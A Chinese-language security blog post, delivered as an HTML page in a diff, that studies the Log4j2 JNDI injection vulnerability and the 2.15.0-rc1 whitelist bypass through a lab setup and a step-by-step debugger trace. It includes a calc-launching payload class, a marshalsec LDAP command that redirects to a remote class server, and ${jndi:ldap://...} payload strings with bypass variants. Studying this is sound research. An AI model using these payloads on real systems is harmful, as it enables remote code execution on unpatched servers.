@@ -1,0 +1,731 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Okaytc" />
+  <meta name="description" content="生活 健身 学习 沉淀" />
+  
+  
+  <title>
+    
+      java安全-Log4j2漏洞原理学习与分析 
+      
+      
+      |
+    
+     Okaytc
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/head-3.jpg">
+    <link rel="icon" href="/images/head-3.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/head-3.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Okaytc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">文章</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">java安全-Log4j2漏洞原理学习与分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2023-03-09 16:41:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                    #Java安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>原理篇到Log4j2部分，拖得有点久了，继续学习分析</p>
+<h1 id="0x01、Log4j2描述"><a href="#0x01、Log4j2描述" class="headerlink" title="0x01、Log4j2描述"></a>0x01、Log4j2描述</h1><p>引用描述：</p>
+<blockquote>
+<p>Apache log4j2是一款开源的Java日志记录框架,提供方便的日志记录，通过定义每一条日志信息的级别，能够更加细致地控制日志生成过程，以便用于编写程序时进行调试，在项目上线后出现状况时也可根据日志记录来判断原因，被广泛大量用于业务系统开发环境中。</p>
+</blockquote>
+<p>由于log4j2的优秀性能，大量java开发系统进行使用，导致影响范围极其广泛。</p>
+<h1 id="0x02、影响范围"><a href="#0x02、影响范围" class="headerlink" title="0x02、影响范围"></a>0x02、影响范围</h1><p>log4j版本 &lt;&#x3D; 2.14.1</p>
+<h1 id="0x03、环境搭建"><a href="#0x03、环境搭建" class="headerlink" title="0x03、环境搭建"></a>0x03、环境搭建</h1><p>项目中pom.xml添加依赖</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.14</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/6e79ce8b/l-1.png" title="环境依赖"></p>
+<h1 id="0x04、漏洞利用"><a href="#0x04、漏洞利用" class="headerlink" title="0x04、漏洞利用"></a>0x04、漏洞利用</h1><p>恶意类编译成class文件：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意类存放位置：</p>
+<p><img src="/posts/6e79ce8b/l-3.png" title="恶意类"></p>
+<p>在恶意类位置开启http服务：</p>
+<p><img src="/posts/6e79ce8b/l-2.png" title="http服务"></p>
+<p>借助marshalsec服务开启ldap服务：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span><span class="number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="comment">//192.168.43.233:8999/#EvilPayload 9998</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/6e79ce8b/l-4.png" title="ldap服务"></p>
+<p>漏洞利用，在log日志记录处输入payload，执行触发漏洞:</p>
+<p><img src="/posts/6e79ce8b/l-5.png" title="执行payload"></p>
+<h1 id="0x05、漏洞分析"><a href="#0x05、漏洞分析" class="headerlink" title="0x05、漏洞分析"></a>0x05、漏洞分析</h1><p>整体来说还是jndi注入的问题，只不过前面经过一系列log4j对字符串的处理取值，最后再执行jndi注入，跟下完整步骤。</p>
+<p>日志记录点处断点：</p>
+<p><img src="/posts/6e79ce8b/l-6.png" title="断点"></p>
+<p>跟进断点，会先进入<code>logIfEnabled</code>方法判断是否开启log日志功能</p>
+<p><img src="/posts/6e79ce8b/l-7.png" title="是否开启日志"></p>
+<p>开启条件需要使用调用的方法值小于&#x3D;&lt;200（注：调用方法的安全等级可以在配置文件中进行修改，修改后的调用方法同样可触发漏洞）</p>
+<p><img src="/posts/6e79ce8b/l-11.png" title="开启条件"></p>
+<p>不同方法对应的level值：<br><img src="/posts/6e79ce8b/l-12.png" title="开启条件"></p>
+<p>调用的<code>error</code>方法值为200，因此能进入到下面的方法，进入到<code>logmassage</code>方法（日志消息方法）中，继续跟进<code>logmassage</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-8.png" title="logmassage"></p>
+<p>接着进入<code>logMessageSafely</code>方法（安全的日志消息方法）中，继续跟进</p>
+<p><img src="/posts/6e79ce8b/l-9.png" title="logMessageTrackRecursion"></p>
+<p>接着进入<code>logMessageTrackRecursion</code>方法（日志消息跟踪递归方法）中</p>
+<p><img src="/posts/6e79ce8b/l-10.png" title="logMessageTrackRecursion"></p>
+<p>进入<code>tryLogMessage</code>方法（尝试记录日志消息方法）</p>
+<p><img src="/posts/6e79ce8b/l-13.png" title="tryLogMessage"></p>
+<p>进而调用log方法，继续跟进</p>
+<p><img src="/posts/6e79ce8b/l-14.png" title="log"></p>
+<p>再进入到<code>LocationAwareReliabilityStrategy</code>的log方法中</p>
+<p><img src="/posts/6e79ce8b/l-15.png" title="LocationAwareReliabilityStrategy.log"><br><img src="/posts/6e79ce8b/l-16.png" title="LocationAwareReliabilityStrategy.log"></p>
+<p>进入到<code>LoggerConfig.log</code>方法中，通过调用<code>createEvent</code>方法将日志消息相关的所有信息封装进一个<code>logEvent</code>对象中</p>
+<p><img src="/posts/6e79ce8b/l-17.png" title="createEvent"><br><img src="/posts/6e79ce8b/l-18.png" title="createEvent"></p>
+<p>创建完后，再调用log方法去处理<code>logEvent</code>对象，跟进</p>
+<p><img src="/posts/6e79ce8b/l-19.png" title="log"></p>
+<p>会经过<code>isFiltered</code>方法判断该对象是否是被过滤的对象</p>
+<p><img src="/posts/6e79ce8b/l-20.png" title="isFiltered"></p>
+<p>由于<code>filter</code>未被调用过赋值过，因此默认为null，因此会返回0，前面由于存在！不等号，因此请求结果为true，进入下一步调用<code>processLogEvent</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-21.png" title="isFiltered"></p>
+<p>跟进<code>processLogEvent</code>方法，调用关键的<code>callAppenders</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-22.png" title="callAppenders"></p>
+<p>这里会调用到<code>appender</code>组件（负责写日志的组件），常见的子类（ConsoleAppender：将日志添加到控制台输出；FileAppender：将日志输入到指定文件中；RollingFileAppender：滚动日志记录，当满足某条件时，将日志输入到指定文件中），这里调用的<code>ConsoleAppender</code></p>
+<p><img src="/posts/6e79ce8b/l-23.png" title="callAppenders"></p>
+<p>然后调用<code>ConsoleAppender</code>的<code>callAppender</code>方法，接着调用<code>callAppenderPreventRecursion</code>方法处理事件</p>
+<p><img src="/posts/6e79ce8b/l-24.png" title="callAppenderPreventRecursion"></p>
+<p><code>callAppenderPreventRecursion</code>方法中调用<code>callAppender0</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-26.png" title="callAppender0"></p>
+<p><code>callAppender0</code>方法会先通过<code>isFilteredByAppender</code>方法判断<code>appender</code>是否是<code>Filterable</code>的子类和判断事件的类型是否是<code>DENY</code></p>
+<p><img src="/posts/6e79ce8b/l-27.png" title="tryCallAppender"></p>
+<p><img src="/posts/6e79ce8b/l-28.png" title="类型判断"></p>
+<p>由于不是因此进入判断体调用<code>tryCallAppender</code>方法，跟进<code>tryCallAppender</code>方法</p>
+<p>该方法调用事件处理器调用<code>append</code>添加事件方法</p>
+<p><img src="/posts/6e79ce8b/l-29.png" title="tryCallAppender"></p>
+<p>跟进<code>append</code>方法，调用<code>tryAppend</code>方法，然后再调用<code>directEncodeEvent</code>方法编码事件</p>
+<p><img src="/posts/6e79ce8b/l-30.png" title="directEncodeEvent"></p>
+<p>跟进<code>directEncodeEvent</code>方法，接着调用<code>encode</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-31.png" title="encode"></p>
+<p>调用<code>toText</code>方法序列化事件数据，然后调用<code>toSerializable</code>方法序列化</p>
+<p><img src="/posts/6e79ce8b/l-32.png" title="toText"></p>
+<p>然后针对格式程序数组<code>formatters[]</code>进行循环调用<code>format</code>格式化数据</p>
+<p><img src="/posts/6e79ce8b/l-33.png" title="formatters"></p>
+<p>漏洞触发位置为<code>Message</code>的格式程序的<code>format</code>处理</p>
+<p><img src="/posts/6e79ce8b/l-34.png" title="formatters"></p>
+<p>跟进到序号8的<code>format</code>处理，调用<code>MessagePatternConverter</code>针对<code>Message</code>的转换器<code>format</code>格式化处理数据</p>
+<p><img src="/posts/6e79ce8b/l-35.png" title="formatters"></p>
+<p>跟进<code>format</code>格式化处理数据，先是获取<code>message</code>信息</p>
+<p><img src="/posts/6e79ce8b/l-36.png" title="获取message信息"></p>
+<p>然后进入判断，<code>config</code>存在，并且允许调用<code>Lookup</code>方法，则进入循环体</p>
+<p><img src="/posts/6e79ce8b/l-37.png" title="条件判断"></p>
+<p>然后对<code>workingBuilder</code>内容进行搜寻字符串如果存在<code>$&#123;</code>符号，则截取完整字符串</p>
+<p><img src="/posts/6e79ce8b/l-38.png" title="截取${字符串"><br><img src="/posts/6e79ce8b/l-39.png" title="截取${字符串"></p>
+<p>对<code>workingBuilder</code>内容添加<code>append</code>事件，但会再次对数据进行处理，通过<code>getStrSubstitutor</code>方法获取<code>StrSubstitutor</code>对象，然后调用<code>replace</code>方法替换字符串</p>
+<p><img src="/posts/6e79ce8b/l-40.png" title="替换字符串"></p>
+<p>跟进<code>replace</code>方法，调用<code>substitute</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-41.png" title="substitute"></p>
+<p>跟进<code>substitute</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-42.png" title="substitute"><br><img src="/posts/6e79ce8b/l-43.png" title="substitute"></p>
+<p>前半段的变量表示：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//prefixMatcher表示&#x27;$&#123;&#x27;前缀</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">prefixMatcher</span> <span class="operator">=</span> getVariablePrefixMatcher();</span><br><span class="line"><span class="comment">//suffixMatcher表示&#x27;&#125;&#x27;后缀</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">suffixMatcher</span> <span class="operator">=</span> getVariableSuffixMatcher();</span><br><span class="line"><span class="comment">//escape表示&#x27;$&#x27;</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">char</span> <span class="variable">escape</span> <span class="operator">=</span> getEscapeChar();</span><br><span class="line"><span class="comment">//valueDelimiterMatcher表示&#x27;:-&#x27;</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">StrMatcher</span> <span class="variable">valueDelimiterMatcher</span> <span class="operator">=</span> getValueDelimiterMatcher();</span><br><span class="line"><span class="comment">//substitutionInVariablesEnabled为true，表示启动变量替换</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">substitutionInVariablesEnabled</span> <span class="operator">=</span> isEnableSubstitutionInVariables();</span><br></pre></td></tr></table></figure>
+
+<p>然后就是判断位置，截选${}里的内容</p>
+<p><img src="/posts/6e79ce8b/l-44.png" title="判断位置"><br><img src="/posts/6e79ce8b/l-45.png" title="截选内容"></p>
+<p>取到${}里的内容后，再对内容进行<code>:\-</code>分割取值<br>如内容为<code>a:\-b</code>，则截选出来值为<code>varname=a</code>,<code>varDefaultValue=b</code>，如果内容中的-号本身就是名称本身，则使用<code>a:\\-b</code>形式转义-号<br>如内容为<code>a:-b</code>,则截选出来值为<code>varname=a</code>,<code>varDefaultValue=b</code></p>
+<p><img src="/posts/6e79ce8b/l-46.png" title="截选内容"></p>
+<p>如果不是上述情况：如内容为<code>a:b</code>，则<code>varname=a:b</code>,<code>varDefaultValue=null</code></p>
+<p><img src="/posts/6e79ce8b/l-47.png" title="截选内容"></p>
+<p>截选完后，下一步调用到<code>resolveVariable</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-48.png" title="resolveVariable"></p>
+<p>跟进<code>resolveVariable</code>方法，调用到<code>lookup</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-49.png" title="lookup"></p>
+<p>跟进<code>lookup</code>方法，前半段是获取内容<code>:</code>前的前缀，识别到<code>jndi</code>，然后查询<code>strLookupMap</code>表，找到<code>jndi</code>对应值获取到<code>jndilookup</code></p>
+<p><img src="/posts/6e79ce8b/l-50.png" title="lookup"><br><img src="/posts/6e79ce8b/l-51.png" title="jndilookup"></p>
+<p>然后调用<code>JndiLookup.lookup</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-52.png" title="jndilookup.lookup"></p>
+<p>触发漏洞</p>
+<p><img src="/posts/6e79ce8b/l-53.png" title="触发漏洞"></p>
+<h1 id="0x06、修复情况"><a href="#0x06、修复情况" class="headerlink" title="0x06、修复情况"></a>0x06、修复情况</h1><p>官方<a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/security.html">修复声明</a>文档</p>
+<p><img src="/posts/6e79ce8b/l-54.png" title="修复"></p>
+<p>2.15.0正式版本修复：关闭了jndi协议，添加白名单机制，只允许本地访问ldap</p>
+<p><img src="/posts/6e79ce8b/l-55.png" title="修复措施"></p>
+<p>2.16.0正式版本修复：日志不再支持lookup功能，lookup功能在配置中仍然可用</p>
+<p>2.17.0正式版本修复：移除LDAP，JNDI连接仅在java协议中被支持</p>
+<p>在2.15.0正式版本之前，依次推出了2.15.0-rc1、2.15.0-rc2的两次补丁，其中rc1存在问题，rc2算是修复rc1的补丁，但这两次rc版本都没在官网上进行发布，而是直接发布在github上，官网正式发布版本为2.15.0，在其之后。</p>
+<hr>
+<p>在部署2.15.0-rc1版本中出了问题，很多仓库都没有rc1版本只有2.15.0的正式版，耽误了很多时间，就按2.15.0正式版本部署上去看区别吧</p>
+<p>在运行流程中toText后格式化信息步骤就跟2.14.0版本发生了变化，到format格式化步骤</p>
+<p><img src="/posts/6e79ce8b/l-59.png" title="格式化步骤"></p>
+<p>这里的转换器变成了<code>MessagePatternConverter</code>类的内部类<code>SimpleMessagePatternConverter</code>来进行处理</p>
+<p><img src="/posts/6e79ce8b/l-60.png" title="格式化步骤"></p>
+<p>因此调用的<code>format</code>方法为调用到该类的<code>formatTo</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-61.png" title="formatTo"></p>
+<p>跟进<code>append</code>方法</p>
+<p><img src="/posts/6e79ce8b/l-62.png" title="append"><br><img src="/posts/6e79ce8b/l-63.png" title="append"><br><img src="/posts/6e79ce8b/l-64.png" title="append"></p>
+<p>这里直接返回输出信息，并不会对信息中的${进行匹配处理</p>
+<p><img src="/posts/6e79ce8b/l-65.png" title="输出"></p>
+<p>到此输出完成，运行结束，其中没有涉及${的匹配处理，也没有调用jndi。</p>
+<p>除此之外，2.15.0-rc1版本开始还对lookup方法进行了修改，添加了条件判断，仅允许本地访问jndi和ldap，也对反序列化数据进行了校验</p>
+<p><img src="/posts/6e79ce8b/l-66.png" title="修复措施"></p>
+<h1 id="0x07、2-15-0-rc1绕过"><a href="#0x07、2-15-0-rc1绕过" class="headerlink" title="0x07、2.15.0-rc1绕过"></a>0x07、2.15.0-rc1绕过</h1><p>根据2.15.0-rc1的修复情况目前知道的点：</p>
+<ul>
+<li>默认情况会调用<code>SimpleMessagePatternConverter</code>类来转换数据并直接输出。</li>
+<li>默认关闭了jndi调用。</li>
+</ul>
+<p>也就是说想要继续匹配<code>$&#123;</code>内容，必须更改转换器，并且开启jndi的调用才能进入到最后的<code>lookup</code>调用的步骤（先不考虑仅允许本地地址调用jndi这个地方，先考虑如何到这里）</p>
+<p>在更换成的<code>MessagePatternConverter</code>类中，存在一个类<code>LookupMessagePatternConverter</code>，该类就跟2.14.0的版本步骤差不多，匹配${截取替换</p>
+<p><img src="/posts/6e79ce8b/l-67.png" title="修复措施"></p>
+<p>也就是将下面的转换器更改成<code>LookupMessagePatternConverter</code>类</p>
+<p><img src="/posts/6e79ce8b/l-60.png" title="格式化步骤"></p>
+<p><code>MessagePatternConverter</code>类的初始化方法<code>newInstance</code>提供了更换转换器，但需要满足条件：</p>
+<ul>
+<li>lookups变量要为true</li>
+<li>存在config</li>
+</ul>
+<p><img src="/posts/6e79ce8b/l-68.png" title="newInstance"></p>
+<p>先看<code>lookups</code>变量的调用方法<code>loadLookups</code>，要求传入的参数等于<code>lookups</code></p>
+<p><img src="/posts/6e79ce8b/l-69.png" title="loadLookups"></p>
+<p>参数为图中的buffer</p>
+<p><img src="/posts/6e79ce8b/l-60.png" title="格式化步骤"></p>
+<p>另外一个条件存在config，即为上图中的event，自然是存在的</p>
+<p>现在思路比较清晰，需要实施的事：</p>
+<ul>
+<li>调用<code>MessagePatternConverter</code>类的<code>newInstance</code>方法，传递<code>event</code>参数和<code>buffer</code>参数，其中<code>buffer</code>参数值要为<code>lookups</code></li>
+</ul>
+<p>这里借用天下大木头师傅的开启payload：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"><span class="comment">//        logger.error(&quot;$&#123;jndi:ldap://localhost:9998/#EvilPayload&#125;&quot;);</span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultConfiguration</span>();</span><br><span class="line">        <span class="type">MessagePatternConverter</span> <span class="variable">messagePatternConverter</span> <span class="operator">=</span> MessagePatternConverter.newInstance(configuration,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;lookups&quot;</span>&#125;);</span><br><span class="line">        <span class="type">LogEvent</span> <span class="variable">logEvent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MutableLogEvent</span>(<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://localhost:9998/ EvilPayload&#125;&quot;</span>),<span class="literal">null</span>);</span><br><span class="line">        messagePatternConverter.format(logEvent,<span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;$&#123;jndi:ldap://localhost:9998/ EvilPayload&#125;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>网上还有种开启方式则是在动态调试中对option进行修改值</p>
+<p>按上面的payload在最后一步进行下断点<br>还是跟2.14.0版本步骤一样替换截选步骤，下面步骤一样，就不跟着分析了</p>
+<p><img src="/posts/6e79ce8b/l-70.png" title="replaceIn"><br><img src="/posts/6e79ce8b/l-71.png" title="替换截选"><br><img src="/posts/6e79ce8b/l-72.png" title="resolveVariable"></p>
+<p>调用jndi.lookup</p>
+<p><img src="/posts/6e79ce8b/l-73.png" title="jndi.lookup"><br><img src="/posts/6e79ce8b/l-74.png" title="jndi.lookup"></p>
+<p>一直到调用到jndiManager.lookup方法</p>
+<p><img src="/posts/6e79ce8b/l-75.png" title="jndiManager.lookup"></p>
+<p>这里协议仅允许java、ldap、ldaps，并且仅允许本地访问</p>
+<p><img src="/posts/6e79ce8b/l-76.png" title="白名单限制"></p>
+<p>如果遇到报错则进入报错体，由于cr1版本的catch为空，因此只要让他报错就能绕过上面的白名单限制</p>
+<p><img src="/posts/6e79ce8b/l-77.png" title="catch为空"></p>
+<p>因此payload可以输下面举例等方式达到报错进入catch体中，变式payload在github上有很多就不一一列举了。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//localhost:9998/ EvilPayload&#125;</span></span><br><span class="line">$&#123;jndi:ldap:<span class="comment">//localhost:9998/\$EvilPayload&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后运行lookup方法触发漏洞（当前版本为2.15.0版本，rc1环境有问题，就不贴触发截图了）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (T) <span class="built_in">this</span>.context.lookup(name);</span><br></pre></td></tr></table></figure>
+
+<p>整体来说除非服务器端更改了配置文件，默认情况开发也不会更改，因此存在漏洞的服务器少了很多的，利用难度也增加了许多，不过可以学习下绕过思路还是能学到很多东西</p>
+<h1 id="0x08、2-15-0-rc2修复"><a href="#0x08、2-15-0-rc2修复" class="headerlink" title="0x08、2.15.0-rc2修复"></a>0x08、2.15.0-rc2修复</h1><p>rc2为rc1的修复补丁，在<code>catch</code>异常体中添加了返回值<code>null</code>，至此rc1漏洞修复</p>
+<p><img src="/posts/6e79ce8b/l-77.png" title="catch返回null"><br><img src="/posts/6e79ce8b/l-78.png" title="catch返回null"></p>
+<h1 id="0x09、总结"><a href="#0x09、总结" class="headerlink" title="0x09、总结"></a>0x09、总结</h1><p>整体流程下来主要是对日志信息进行截取替换选取出${}的内容，再根据内容头的协议调用协议对应的lookup方法导致jndi注入，流程链比较长，但核心链比较容易理解和跟踪；rc1则是默认关闭jndi-lookup方法，并且更换了转换器去处理日志信息，并增加了白名单机值去处理lookup访问请求，但由于catch抛出异常体未做处理导致可以绕过，利用环境也更难，总之还是能学到很多东西。</p>
+<h1 id="0x10、参考链接"><a href="#0x10、参考链接" class="headerlink" title="0x10、参考链接"></a>0x10、参考链接</h1><p><a target="_blank" rel="noopener" href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/els4r7">https://www.yuque.com/tianxiadamutou/zcfd4v/els4r7</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cdyunaq/article/details/121927991">https://blog.csdn.net/cdyunaq/article/details/121927991</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/10575800.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2023-03-09 16:41:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
+                        #Java安全
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81Log4j2%E6%8F%8F%E8%BF%B0"><span class="toc-text">0x01、Log4j2描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">0x02、影响范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x03、环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x04、漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x05、漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06%E3%80%81%E4%BF%AE%E5%A4%8D%E6%83%85%E5%86%B5"><span class="toc-text">0x06、修复情况</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07%E3%80%812-15-0-rc1%E7%BB%95%E8%BF%87"><span class="toc-text">0x07、2.15.0-rc1绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08%E3%80%812-15-0-rc2%E4%BF%AE%E5%A4%8D"><span class="toc-text">0x08、2.15.0-rc2修复</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">0x09、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0x10、参考链接</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  
+    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
+  
+
+  <div id="vcomments"></div>
+
+  <script>
+    function loadValineSuc() {
+      new Valine({
+        el: '#vcomments',
+        appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
+        appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
+        placeholder: 'here',
+        avatar: 'monsterid',
+        lang: 'zh-CN'
+      })
+    }
+  </script>
+
+    <style>
+      .comments-container .v .vempty {
+        display: none!important;
+      }
+    </style>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/Okaytc">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">Copyright © Okaytc 2022</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://okaytc.github.io/">一个热爱健身的脚本小子</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
